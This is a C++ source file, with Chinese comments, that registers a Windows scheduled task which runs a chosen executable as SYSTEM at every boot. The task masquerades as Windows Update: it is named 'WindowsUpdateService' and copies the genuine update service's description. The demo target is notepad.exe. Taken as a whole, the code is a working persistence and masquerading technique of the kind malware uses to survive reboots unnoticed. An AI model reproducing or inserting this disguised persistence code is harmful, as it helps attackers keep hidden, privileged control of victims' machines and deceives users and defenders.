// Plan_Task_Startup.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "Plan_Task_Startup.h"

#include <Windows.h>
#include <string>
#include <comdef.h>
#include <atlbase.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")

int AddTask(LPWSTR filePath)
{
    // Check Path and fileAttributes
    if (filePath == nullptr) {
        std::cout << "Error: Path is null." << std::endl;
        return 1;
    }

    DWORD fileAttributes = GetFileAttributesW(filePath);
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        std::cout << "Error: Failed to get file attributes." << std::endl;
        return 1;
    }

    if ((fileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
        std::cout << "Error: Specified path is a directory." << std::endl;
        return 1;
    }

    // 初始化 COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return 1;
    }

    // 初始化 COM 安全性
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);
    if (FAILED(hr)) {
        CoUninitialize();
        return 1;
    }

    try {
        // 创建实例
        CComPtr<ITaskService> taskService;
        hr = taskService.CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        hr = taskService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        // 获取ITaskFolder接口
        CComPtr<ITaskFolder> rootFolder;
        hr = taskService->GetFolder(_bstr_t(L"\\"), &rootFolder);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        // 删除指定名称的任务避免冲突
        std::wstring taskName = L"WindowsUpdateService";
        rootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);

        // 新建任务
        CComPtr<ITaskDefinition> taskDefinition;
        hr = taskService->NewTask(0, &taskDefinition);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        // 获取注册信息接口
        CComPtr<IRegistrationInfo> regInfo;
        hr = taskDefinition->get_RegistrationInfo(&regInfo);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        // 设置创建者
        hr = regInfo->put_Author(_bstr_t(L"Administrator"));
        // 设置描述
        hr = regInfo->put_Description(_bstr_t(L"使你的 Windows 保持最新状态。如果此任务已禁用或停止，则 Windows 将无法保持最新状态，这意味着无法修复可能产生的安全漏洞，并且功能也可能无法使用。"));

        CComPtr<ITaskSettings> taskSettings;
        hr = taskDefinition->get_Settings(&taskSettings);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        // 系统启动时启动任务的触发器
        hr = taskSettings->put_StartWhenAvailable(VARIANT_TRUE);
        CComPtr<ITriggerCollection> triggerCollection;
        hr = taskDefinition->get_Triggers(&triggerCollection);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }
        CComPtr<ITrigger> trigger;
        hr = triggerCollection->Create(TASK_TRIGGER_BOOT, &trigger);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        CComPtr<IBootTrigger> bootTrigger;
        hr = trigger->QueryInterface(IID_IBootTrigger, (void**)&bootTrigger);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        hr = bootTrigger->put_Id(_bstr_t(L"UpdateService"));
        hr = bootTrigger->put_StartBoundary(_bstr_t(L"2021-01-01T12:00:00"));// 启动
        hr = bootTrigger->put_EndBoundary(_bstr_t(L"2023-12-31T00:00:00"));// 结束
        hr = bootTrigger->put_Delay(_bstr_t("PT1M"));// 延迟

        // 创建执行动作，添加任务
        CComPtr<IActionCollection> actionCollection;
        hr = taskDefinition->get_Actions(&actionCollection);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        CComPtr<IAction> action;
        hr = actionCollection->Create(TASK_ACTION_EXEC, &action);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        CComPtr<IExecAction> execAction;
        hr = action->QueryInterface(IID_IExecAction, (void**)&execAction);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        hr = execAction->put_Path(filePath);

        // 注册定义任务
        CComPtr<IRegisteredTask> registeredTask;
        VARIANT password;
        password.vt = VT_EMPTY;
        hr = rootFolder->RegisterTaskDefinition(
            _bstr_t(taskName.c_str()),
            taskDefinition,
            TASK_CREATE_OR_UPDATE,
            _variant_t(L"SYSTEM"),
            password,
            TASK_LOGON_SERVICE_ACCOUNT,
            _variant_t(L""),
            &registeredTask);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }

        CoUninitialize();
        return 0;
    }
    catch (...) {
        CoUninitialize();
        return 1;
    }
}

int main()
{
    LPWSTR filePath = (LPWSTR)L"C:\\Windows\\System32\\notepad.exe";
    __try {
        AddTask(filePath);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        std::cout << "Error: Exception occurred." << std::endl;
    }
    return 0;
}


// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
